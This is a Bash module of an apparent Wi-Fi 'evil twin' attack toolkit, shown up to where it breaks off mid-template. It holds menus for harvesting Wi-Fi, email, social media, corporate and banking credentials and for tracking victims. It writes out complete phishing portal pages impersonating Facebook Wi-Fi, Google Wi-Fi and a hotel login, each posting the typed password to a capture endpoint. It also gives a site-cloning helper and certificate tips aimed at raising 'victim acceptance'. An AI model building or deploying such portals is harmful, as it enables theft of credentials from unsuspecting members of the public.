#!/bin/bash

# Captive Portal module

# Captive portal menu
captive_portal_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}              CAPTIVE PORTAL ATTACKS                    ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} Quick Evil Twin          ${GRAY}Fast setup with templates${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Custom Captive Portal    ${GRAY}Create custom pages${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} Portal Templates         ${GRAY}Browse template gallery${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Targeted Attack         ${GRAY}Specific venue pages${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} HTTPS Captive Portal     ${GRAY}SSL-enabled portal${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Credential Harvesting    ${GRAY}Advanced harvesting${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Page Redirects         ${GRAY}Redirect to sites${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[8]${WHITE} Analytics & Tracking     ${GRAY}Monitor victims${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[9]${WHITE} Portal Manager          ${GRAY}Manage active portals${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        
        read -p "Select an option: " choice
        
        case $choice in
            1) quick_evil_twin ;;
            2) custom_captive_portal ;;
            3) portal_templates ;;
            4) targeted_attack ;;
            5) https_captive_portal ;;
            6) credential_harvesting ;;
            7) page_redirects ;;
            8) analytics_tracking ;;
            9) portal_manager ;;
            0) break ;;
            *) 
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# Custom captive portal creation
custom_captive_portal() {
    clear
    echo -e "${BLUE}Custom Captive Portal${NC}"
    echo -e "${GRAY}====================${NC}"
    
    echo -e "${WHITE}Custom Portal Options:${NC}"
    echo -e "${CYAN}[1]${NC} Create new portal from scratch"
    echo -e "${CYAN}[2]${NC} Edit existing template"
    echo -e "${CYAN}[3]${NC} Import HTML/CSS files"
    echo -e "${CYAN}[4]${NC} Clone existing website"
    echo -e "${CYAN}[5]${NC} Mobile-responsive design"
    echo -e "${CYAN}[6]${NC} Multi-language portal"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) create_portal_from_scratch ;;
        2) edit_existing_template ;;
        3) import_files ;;
        4) clone_website ;;
        5) mobile_responsive ;;
        6) multi_language ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Portal templates gallery
portal_templates() {
    while true; do
        clear
        echo -e "${BLUE}Portal Templates Gallery${NC}"
        echo -e "${GRAY}=======================${NC}"
        
        echo -e "${WHITE}Available Templates:${NC}"
        echo -e "${CYAN}[1]${NC} Facebook WiFi"
        echo -e "${CYAN}[2]${NC} Google WiFi"
        echo -e "${CYAN}[3]${NC} Hotel WiFi Portal"
        echo -e "${CYAN}[4]${NC} Airport WiFi"
        echo -e "${CYAN}[5]${NC} Starbucks Coffee Shop"
        echo -e "${CYAN}[6]${NC} University Campus WiFi"
        echo -e "${CYAN}[7]${NC} Corporate Login"
        echo -e "${CYAN}[8]${NC} Router Configuration"
        echo -e "${CYAN}[9]${NC} Telco Provider Portal"
        echo -e "${CYAN}[10]${NC} Mall/Shopping Center"
        echo -e "${CYAN}[11]${NC} Generic Public WiFi"
        echo -e "${CYAN}[0]${NC} Back"
        echo ""
        
        read -p "Select template: " choice
        
        case $choice in
            1) load_template "facebook-wifi" ;;
            2) load_template "google-wifi" ;;
            3) load_template "hotel-portal" ;;
            4) load_template "airport-portal" ;;
            5) load_template "starbucks-portal" ;;
            6) load_template "university-portal" ;;
            7) load_template "corporate-login" ;;
            8) load_template "router-config" ;;
            9) load_template "telco-portal" ;;
            10) load_template "mall-portal" ;;
            11) load_template "generic-public" ;;
            0) break ;;
            *) 
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# Targeted attack
targeted_attack() {
    clear
    echo -e "${BLUE}Targeted Captive Portal Attack${NC}"
    echo -e "${GRAY}================================${NC}"
    
    echo -e "${WHITE}Target Options:${NC}"
    echo -e "${CYAN}[1]${NC} Corporate environment"
    echo -e "${CYAN}[2]${NC} Educational institution"
    echo -e "${CYAN}[3]${NC} Healthcare facility"
    echo -e "${CYAN}[4]${NC} Government building"
    echo -e "${CYAN}[5]${NC} Retail environment"
    echo -e "${CYAN}[6]${NC} Transportation hub"
    echo -e "${CYAN}[7]${NC} Residential complex"
    echo -e "${CYAN}[8]${NC} Custom target analysis"
    echo ""
    
    read -p "Select target type: " choice
    
    case $choice in
        1) corporate_target ;;
        2) education_target ;;
        3) healthcare_target ;;
        4) government_target ;;
        5) retail_target ;;
        6) transport_target ;;
        7) residential_target ;;
        8) custom_target ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# HTTPS captive portal
https_captive_portal() {
    clear
    echo -e "${BLUE}HTTPS Captive Portal${NC}"
    echo -e "${GRAY}===================${NC}"
    
    echo -e "${YELLOW}[*] HTTPS Captive Portal Setup${NC}"
    echo ""
    echo -e "${WHITE}Benefits:${NC}"
    echo -e "• No browser security warnings"
    echo -e "• Higher victim acceptance rate"
    echo -e "• Professional appearance"
    echo -e "• Bypasses HTTPS-only policies"
    echo ""
    
    echo -e "${YELLOW}[*] Requirements:${NC}"
    echo -e "• Valid SSL certificate"
    echo -e "• Custom domain name"
    echo -e "• DNS configuration"
    echo ""
    
    echo -e "${WHITE}Setup Options:${NC}"
    echo -e "${CYAN}[1]${NC} Use commercial certificate"
    echo -e "${CYAN}[2]${NC} Let's Encrypt certificate"
    echo -e "${CYAN}[3]${NC} Self-signed certificate"
    echo -e "${CYAN}[4]${NC} Certificate information"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) commercial_cert ;;
        2) letsencrypt_cert ;;
        3) selfsigned_cert ;;
        4) cert_info ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Credential harvesting
credential_harvesting() {
    clear
    echo -e "${BLUE}Credential Harvesting${NC}"
    echo -e "${GRAY}======================${NC}"
    
    echo -e "${WHITE}Harvesting Options:${NC}"
    echo -e "${CYAN}[1]${NC} WiFi password collection"
    echo -e "${CYAN}[2]${NC} Email credential collection"
    echo -e "${CYAN}[3]${NC} Social media credentials"
    echo -e "${CYAN}[4]${NC} Corporate login credentials"
    echo -e "${CYAN}[5]${NC} Banking credentials (WARNING: High risk)"
    echo -e "${CYAN}[6]${NC} Multi-credential form"
    echo -e "${CYAN}[7]${NC} Progressive authentication"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) wifi_password_harvest ;;
        2) email_harvest ;;
        3) social_harvest ;;
        4) corporate_harvest ;;
        5) banking_harvest ;;
        6) multi_harvest ;;
        7) progressive_auth ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Page redirects
page_redirects() {
    clear
    echo -e "${BLUE}Page Redirects${NC}"
    echo -e "${GRAY}==============${NC}"
    
    echo -e "${WHITE}Redirect Options:${NC}"
    echo -e "${CYAN}[1]${NC} Redirect to legitimate site"
    echo -e "${CYAN}[2]${NC} Educational redirect page"
    echo -e "${CYAN}[3]${NC} Virus warning redirect"
    echo -e "${CYAN}[4]${NC} Maintenance page redirect"
    echo -e "${CYAN}[5]${NC} Advertisement redirect"
    echo -e "${CYAN}[6]${NC} Custom redirect URL"
    echo -e "${CYAN}[7]${NC} Conditional redirects"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) legitimate_redirect ;;
        2) educational_redirect ;;
        3) virus_redirect ;;
        4) maintenance_redirect ;;
        5) ad_redirect ;;
        6) custom_redirect ;;
        7) conditional_redirect ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Analytics and tracking
analytics_tracking() {
    clear
    echo -e "${BLUE}Analytics & Tracking${NC}"
    echo -e "${GRAY}=====================${NC}"
    
    echo -e "${WHITE}Tracking Options:${NC}"
    echo -e "${CYAN}[1]${NC} View captured credentials"
    echo -e "${CYAN}[2]${NC} Victim device fingerprinting"
    echo -e "${CYAN}[3]${NC} Connection statistics"
    echo -e "${CYAN}[4]${NC} Geographic location tracking"
    echo -e "${CYAN}[5]${NC} Behavioral analytics"
    echo -e "${CYAN}[6]${NC} Export data for analysis"
    echo -e "${CYAN}[7]${NC} Real-time monitoring"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) view_credentials ;;
        2) device_fingerprinting ;;
        3) connection_stats ;;
        4) location_tracking ;;
        5) behavioral_analytics ;;
        6) export_data ;;
        7) realtime_monitoring ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Portal manager
portal_manager() {
    clear
    echo -e "${BLUE}Portal Manager${NC}"
    echo -e "${GRAY}==============${NC}"
    
    echo -e "${White}Portal Management:${NC}"
    echo -e "${CYAN}[1]${NC} View active portals"
    echo -e "${CYAN}[2]${NC} Stop specific portal"
    echo -e "${CYAN}[3]${NC} Restart portal"
    echo -e "${CYAN}[4]${NC} Portal performance metrics"
    echo -e "${CYAN}[5]${NC} Backup portal configurations"
    echo -e "${CYAN}[6]${NC} Restore portal configuration"
    echo -e "${CYAN}[7]${NC} Delete portal data"
    echo ""
    
    read -p "Select option: " choice
    
    case $choice in
        1) view_active_portals ;;
        2) stop_portal ;;
        3) restart_portal ;;
        4) portal_metrics ;;
        5) backup_portal ;;
        6) restore_portal ;;
        7) delete_portal ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 2
            ;;
    esac
}

# Helper functions for captive portal

# Load template
load_template() {
    local template_name="$1"
    local template_dir="$TEMPLATES_DIR/$template_name"
    
    echo -e "${YELLOW}[*] Loading template: $template_name${NC}"
    
    if [[ -d "$template_dir" ]]; then
        echo -e "${GREEN}[✓] Template found${NC}"
        
        # Show template info
        if [[ -f "$template_dir/info.txt" ]]; then
            echo ""
            echo -e "${WHITE}Template Information:${NC}"
            cat "$template_dir/info.txt"
        fi
        
        echo ""
        read -p "Use this template? (y/N): " use_template
        
        if [[ "$use_template" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*] Template selected for Evil Twin attack${NC}"
            # Copy template to working directory
            cp -r "$template_dir" "$CONFIG_DIR/active_portal"
            success "Template loaded successfully!"
        fi
    else
        echo -e "${YELLOW}[*] Creating template: $template_name${NC}"
        create_template "$template_name"
    fi
    
    pause
}

# Create template
create_template() {
    local template_name="$1"
    local template_dir="$TEMPLATES_DIR/$template_name"
    
    mkdir -p "$template_dir"
    
    case $template_name in
        "facebook-wifi")
            create_facebook_template "$template_dir"
            ;;
        "google-wifi")
            create_google_template "$template_dir"
            ;;
        "hotel-portal")
            create_hotel_template "$template_dir"
            ;;
        "airport-portal")
            create_airport_template "$template_dir"
            ;;
        "starbucks-portal")
            create_starbucks_template "$template_dir"
            ;;
        *)
            create_basic_template "$template_dir"
            ;;
    esac
    
    success "Template $template_name created"
}

# Create Facebook template
create_facebook_template() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Wi-Fi</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 1024 1024%22><path fill=%221877f2%22 d=%22M1024,512C1024,229.2,794.8,0,512,0S0,229.2,0,512c0,255.6,187.2,467.4,432,505.8V660H302V512h130V399.2C432,270.9,508.4,200,625.4,200c56,0,114.6,10,114.6,10v126h-64.6c-63.6,0-83.4,39.5-83.4,80v96h142l-22.7,148H592v357.8C836.8,979.4,1024,767.6,1024,512z%22/></svg>">
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="100" height="100" viewBox="0 0 1024 1024">
                <path fill="#1877f2" d="M1024,512C1024,229.2,794.8,0,512,0S0,229.2,0,512c0,255.6,187.2,467.4,432,505.8V660H302V512h130V399.2C432,270.9,508.4,200,625.4,200c56,0,114.6,10,114.6,10v126h-64.6c-63.6,0-83.4,39.5-83.4,80v96h142l-22.7,148H592v357.8C836.8,979.4,1024,767.6,1024,512z"/>
            </svg>
        </div>
        <h1>Welcome to Facebook Wi-Fi</h1>
        <p>To access free Wi-Fi, please log in with your network password</p>
        
        <form method="POST" action="check.htm" id="loginForm">
            <div class="form-group">
                <label for="password">Network Password</label>
                <input type="password" 
                       id="password" 
                       name="password" 
                       placeholder="Enter WiFi password" 
                       required 
                       autocomplete="off">
            </div>
            <button type="submit" class="btn-primary">Connect to WiFi</button>
        </form>
        
        <div class="footer">
            <small>Powered by Facebook Wi-Fi</small>
        </div>
    </div>
</body>
</html>
EOF

    cat > "$dir/style.css" << 'EOF'
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.container {
    background: white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.1);
    max-width: 400px;
    width: 100%;
    text-align: center;
}

.logo {
    margin-bottom: 20px;
}

h1 {
    font-size: 24px;
    margin-bottom: 10px;
    color: #1877f2;
}

p {
    color: #65676b;
    margin-bottom: 30px;
    font-size: 14px;
}

.form-group {
    margin-bottom: 20px;
    text-align: left;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: #1c1e21;
    font-size: 14px;
}

input[type="password"] {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid #dddfe2;
    border-radius: 6px;
    font-size: 16px;
    transition: border-color 0.2s;
}

input[type="password"]:focus {
    outline: none;
    border-color: #1877f2;
}

.btn-primary {
    width: 100%;
    padding: 12px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
}

.btn-primary:hover {
    background: #166fe5;
}

.btn-primary:active {
    background: #1464d4;
}

.footer {
    margin-top: 30px;
    color: #65676b;
}

@media (max-width: 480px) {
    .container {
        padding: 30px 20px;
    }
    
    h1 {
        font-size: 20px;
    }
}
EOF

    cat > "$dir/info.txt" << 'EOF'
Template: Facebook WiFi
Description: High-conversion portal mimicking Facebook's Wi-Fi service
Features:
• Modern Facebook branding
• Mobile responsive design
• Professional appearance
• High user trust factor
Best for: Urban environments, coffee shops, public areas
Auth method: Single password field (password field name: "password")
EOF
}

# Create Google template
create_google_template() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google WiFi</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="120" height="40" viewBox="0 0 74 24">
                <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.96 2.58-2.02 3.06v1.78h3.28c-.73-2.03-2.88-3.5-5.6-3.5A5.5 5.5 0 0 0 3.75 14.1c-.83-1.24-.83-2.48 0-3.72A5.5 5.5 0 0 0 9.24 8.19"/>
                <path fill="#EA4335" d="M12.25 12a5.5 5.5 0 0 1 1.32 3.58 5.5 5.5 0 0 1 4.83-2.85 2.84 2.84 0 0 0 1.49-2.85A5.5 5.5 0 0 0 12.25 12"/>
                <path fill="#FBBC05" d="M7.53 10.52A5.5 5.5 0 0 1 9.24 8.19a5.5 5.5 0 0 1 3.01-2.85c.33-.08.66-.13 1.01-.13a5.5 5.5 0 0 1 3.73 1.72l2.69-2.69A5.5 5.5 0 0 0 7.53 10.52"/>
                <path fill="#34A853" d="M22.5 12a5.5 5.5 0 0 0-1.5-4.13l-2.69 2.69A5.5 5.5 0 0 1 18.75 14.1c1.48 0 2.68-.35 3.53-.96l-2.69-2.69A5.5 5.5 0 0 0 22.5 12"/>
            </svg>
        </div>
        <h1>Google Wi-Fi</h1>
        <p>Connect to Google's free Wi-Fi network</p>
        
        <form method="POST" action="check.htm">
            <div class="form-group">
                <label for="password">Enter password</label>
                <input type="password" 
                       id="password" 
                       name="password" 
                       placeholder="Enter Wi-Fi password" 
                       required 
                       autocomplete="off">
            </div>
            <div class="form-group">
                <label class="checkbox">
                    <input type="checkbox" id="remember">
                    <span>Remember this network</span>
                </label>
            </div>
            <button type="submit" class="btn-primary">Connect</button>
        </form>
        
        <div class="footer">
            <small>Terms apply • Privacy</small>
        </div>
    </div>
</body>
</html>
EOF

    cat > "$dir/style.css" << 'EOF'
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Roboto', sans-serif;
    background: #f8f9fa;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
}

.container {
    background: white;
    padding: 48px;
    border-radius: 8px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
    max-width: 448px;
    width: 100%;
}

.logo {
    margin-bottom: 24px;
    text-align: center;
}

h1 {
    font-size: 24px;
    margin-bottom: 8px;
    color: #202124;
    font-weight: 400;
}

p {
    color: #5f6368;
    margin-bottom: 24px;
    font-size: 14px;
}

.form-group {
    margin-bottom: 16px;
}

label {
    display: block;
    margin-bottom: 8px;
    color: #5f6368;
    font-size: 14px;
}

input[type="password"] {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    font-size: 16px;
    transition: border-color 0.2s;
    background: #fff;
}

input[type="password"]:focus {
    outline: none;
    border-color: #4285f4;
}

.checkbox {
    display: flex;
    align-items: center;
    cursor: pointer;
}

.checkbox input {
    margin-right: 8px;
}

.btn-primary {
    width: 100%;
    padding: 12px 24px;
    background: #4285f4;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s;
    text-transform: uppercase;
    letter-spacing: 0.25px;
}

.btn-primary:hover {
    background: #357ae8;
}

.footer {
    margin-top: 24px;
    text-align: center;
}

.footer small {
    color: #5f6368;
    font-size: 12px;
}
EOF

    cat > "$dir/info.txt" << 'EOF'
Template: Google WiFi
Description: Clean, professional Google-branded Wi-Fi portal
Features:
• Google Material Design
• Trustworthy Google branding
• Minimal, clean interface
• High conversion rate
Best for: Professional environments, offices, modern venues
Auth method: Single password field (password field name: "password")
EOF
}

# Create hotel template
create_hotel_template() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel WiFi - Guest Portal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🏨 Hotel WiFi</div>
            <h1>Welcome Guest</h1>
            <p>Please authenticate to access complimentary WiFi</p>
        </div>
        
        <form method="POST" action="check.htm" class="auth-form">
            <div class="form-row">
                <div class="form-group">
                    <label for="room">Room Number</label>
                    <input type="text" id="room" name="room" placeholder="e.g., 101" required>
                </div>
                <div class="form-group">
                    <label for="lastname">Last Name</label>
                    <input type="text" id="lastname" name="lastname" placeholder="Guest last name">
                </div>
            </div>
            <div class="form-group">
                <label for="password">Network Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required>
            </div>
            <button type="submit" class="btn-primary">Connect to WiFi</button>
        </form>
        
        <div class="footer">
            <div class="info">
                <p>Connection Info: Free for all hotel guests</p>
                <p>Support: Contact front desk | Ext. 0</p>
            </div>
            <div class="terms">
                <small>By connecting, you agree to our Terms of Service</small>
            </div>
        </div>
    </div>
</body>
</html>
EOF

    cat > "$dir/style.css" << 'EOF'
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    padding: 20px;
}

.container {
    background: white;
    max-width: 600px;
    width: 100%;
    border-radius: 12px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.15);
    overflow: hidden;
}

.header {
    background: #2c3e50;
    color: white;
    padding: 40px 40px 30px;
    text-align: center;
}

.logo {
    font-size: 36px;
    margin-bottom: 15px;
}

h1 {
    font-size: 28px;
    margin-bottom: 10px;
    font-weight: 300;
}

p {
    font-size: 16px;
    opacity: 0.8;
}

.auth-form {
    padding: 40px;
}

.form-row {
    display: flex;
    gap: 20px;
    margin-bottom: 20px;
}

.form-group {
    flex: 1;
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    color: #2c3e50;
    font-weight: 600;
    font-size: 14px;
}

input[type="text"],
input[type="password"] {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid #e0e0e0;
    border-radius: 6px;
    font-size: 16px;
    transition: all 0.3s;
    background: #f8f9fa;
}

input[type="text"]:focus,
input[type="password"]:focus {
    outline: none;
    border-color: #3498db;
    background: white;
}

.btn-primary {
    width: 100%;
    padding: 16px;
    background: #3498db;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.btn-primary:hover {
    background: #2980b9;
    transform: translateY(-2px);
}

.footer {
    background: #f8f9fa;
    padding: 30px 40px;
    border-top: 1px solid #e0e0e0;
}

.info p {
    color: #7f8c8d;
    font-size: 14px;
    margin-bottom: 8px;
    text-align: center;
}

.terms {
    text-align: center;
    margin-top: 20px;
}

.terms small {
    color: #95a5a6;
    font-size: 12px;
}

@media (max-width: 600px) {
    .form-row {
        flex-direction: column;
        gap: 0;
    }
    
    .container {
        margin: 20px;
    }
    
    .header,
    .auth-form,
    .footer {
        padding: 30px 20px;
    }
}
EOF

    cat > "$dir/info.txt" << 'EOF'
Template: Hotel WiFi Portal
Description: Professional hotel guest authentication portal
Features:
• Room number and name fields for authenticity
• Hotel branding and professional design
• High conversion in hospitality environments
• Detailed terms and support info
Best for: Hotels, motels, resorts, hospitality venues
Auth method: Room + name + password (password field name: "password")
EOF
}

# Additional template creation functions would go here...
# create_airport_template, create_starbucks_template, etc.

# Targeted attack functions
corporate_target() {
    echo -e "${YELLOW}[*] Corporate Environment Attack${NC}"
    echo -e "${YELLOW}[!] Use corporate-branded portal${NC}"
    echo -e "${YELLOW}[!] Include company name, logo, colors${NC}"
    
    # Load corporate template
    load_template "corporate-login"
}

# Additional targeted attack functions would go here...

# Certificate management
commercial_cert() {
    echo -e "${YELLOW}[*] Commercial Certificate Setup${NC}"
    echo ""
    echo -e "${WHITE}Steps:${NC}"
    echo "1. Purchase SSL certificate from CA (Comodo, DigiCert, etc.)"
    echo "2. Configure domain name (e.g., yourwififactory.com)"
    echo "3. Set up DNS records"
    echo "4. Install certificate on captive portal"
    echo "5. Configure HTTPS redirect"
    
    pause
}

letsencrypt_cert() {
    echo -e "${YELLOW}[*] Let's Encrypt Certificate${NC}"
    echo ""
    echo -e "${WHITE}Requirements:${NC}"
    echo "• Domain name ownership"
    echo "• Public IP address"
    echo "• Let's Encrypt client (certbot)"
    echo ""
    echo -e "${WHITE}Setup:${NC}"
    echo "1. Install certbot: sudo apt install certbot"
    echo "2. Request certificate: certbot certonly --standalone"
    echo "3. Configure in captive portal"
    
    pause
}

selfsigned_cert() {
    echo -e "${YELLOW}[*] Self-Signed Certificate${NC}"
    echo ""
    echo -e "${WHITE}Generate certificate:${NC}"
    echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365"
    echo ""
    echo -e "${RED}[!] Warning: Browsers will show security warnings${NC}"
    echo -e "${RED}[!] User must manually bypass security warning${NC}"
    
    pause
}

cert_info() {
    echo -e "${YELLOW}[*] SSL Certificate Information${NC}"
    echo ""
    echo -e "${WHITE}Types:${NC}"
    echo "• Commercial: Most trusted, requires purchase"
    echo "• Let's Encrypt: Free, valid for 90 days, auto-renew"
    echo "• Self-signed: Free, but untrusted by browsers"
    echo ""
    echo -e "${WHITE}Requirements for HTTPS portal:${NC}"
    echo "• Valid certificate (any type)"
    echo "• Dedicated IP address"
    echo "• Domain name configuration"
    echo "• Port 443 forwarding"
    
    pause
}

# Additional helper functions for other options would be implemented similarly...

# ══════════════════════════════════════════════════════════════════════════════
# Missing Captive Portal Functions - Template Generators & Harvest Functions
# ══════════════════════════════════════════════════════════════════════════════

# Custom portal creation
create_portal_from_scratch() {
    clear
    echo -e "${BLUE}Create Portal from Scratch${NC}"
    echo -e "${GRAY}============================${NC}"
    
    read -p "Enter portal name: " portal_name
    [[ -z "$portal_name" ]] && portal_name="custom_portal"
    
    local portal_dir="$LOGS_DIR/portals/$portal_name"
    mkdir -p "$portal_dir"
    
    # Create basic index.html
    cat > "$portal_dir/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Login Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free WiFi</h1>
        <p style="text-align: center; color: #666;">Enter WiFi password to continue</p>
        <form method="POST" action="capture.php">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF
    
    success "Portal created at: $portal_dir"
    echo -e "${YELLOW}[*] Edit $portal_dir/index.html to customize${NC}"
    pause
}

# Edit existing template
edit_existing_template() {
    clear
    echo -e "${BLUE}Edit Existing Template${NC}"
    echo -e "${GRAY}======================${NC}"
    
    read -p "Enter template file path: " template_file
    
    if [[ -f "$template_file" ]]; then
        nano "$template_file"
        success "Template updated"
    else
        echo -e "${RED}[!] File not found${NC}"
    fi
    pause
}

# Import files
import_files() {
    clear
    echo -e "${BLUE}Import HTML/CSS Files${NC}"
    echo -e "${GRAY}=====================${NC}"
    
    read -p "Enter source directory: " src_dir
    read -p "Enter destination directory: " dst_dir
    
    if [[ -d "$src_dir" ]]; then
        cp -r "$src_dir"/* "$dst_dir" 2>/dev/null
        success "Files imported"
    else
        echo -e "${RED}[!] Source directory not found${NC}"
    fi
    pause
}

# Clone website
clone_website() {
    clear
    echo -e "${BLUE}Clone Existing Website${NC}"
    echo -e "${GRAY}======================${NC}"
    
    read -p "Enter website URL to clone: " target_url
    read -p "Enter output directory: " output_dir
    
    if ! command -v wget &>/dev/null; then
        echo -e "${RED}[!] wget not found${NC}"
        pause
        return
    fi
    
    mkdir -p "$output_dir"
    echo -e "${YELLOW}[*] Cloning website...${NC}"
    
    # wget -q --mirror --page-requisites --html-extension --convert-links \
    #     --output-document="$output_dir/index.html" "$target_url" 2>/dev/null
    
    echo -e "${YELLOW}[!] For offline cloning, use: wget -r -k -E -p -P $output_dir $target_url${NC}"
    pause
}

# Mobile responsive design
mobile_responsive() {
    clear
    echo -e "${BLUE}Mobile-Responsive Design${NC}"
    echo -e "${GRAY}==========================${NC}"
    
    local portal_dir="$LOGS_DIR/portals/mobile_responsive"
    mkdir -p "$portal_dir"
    
    cat > "$portal_dir/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 400px; width: 100%; }
        h1 { text-align: center; color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { text-align: center; color: #999; margin-bottom: 30px; font-size: 14px; }
        input { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        button:hover { background: #764ba2; }
        @media (max-width: 480px) { .container { padding: 30px 15px; } h1 { font-size: 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>📡 Free WiFi</h1>
        <p class="subtitle">Enter password to connect</p>
        <form method="POST" action="capture.php">
            <input type="password" name="password" placeholder="WiFi Password" required>
